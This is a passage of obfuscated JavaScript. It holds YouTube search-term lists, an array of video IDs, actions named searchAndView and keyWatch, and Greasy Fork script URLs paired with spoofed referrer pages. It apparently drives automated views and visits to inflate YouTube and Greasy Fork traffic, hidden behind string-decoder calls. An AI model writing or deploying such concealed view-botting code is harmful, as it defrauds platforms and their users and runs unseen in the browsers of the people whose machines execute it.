'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + Y(0x1e, 'Ksrp') + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + Z(0x1) + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + Y(0x10, 'mw8b') + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x2e1 + -0x30d * 0x2 + 0x905)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa85 * 0x3 + -0x1eff + -0x86)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + Y(0x7, 'tyk7') + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1f * 0xb7 + 0x151b * -0x1 + 0x2b47);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    a0(0x17) + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    Z(0xc) + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    Z(0x1b) + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    Z(0x8) + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    Y(0x9, ')ac8') + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': a0(0xb) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': Z(0x19) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x15, 'Y(q2')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
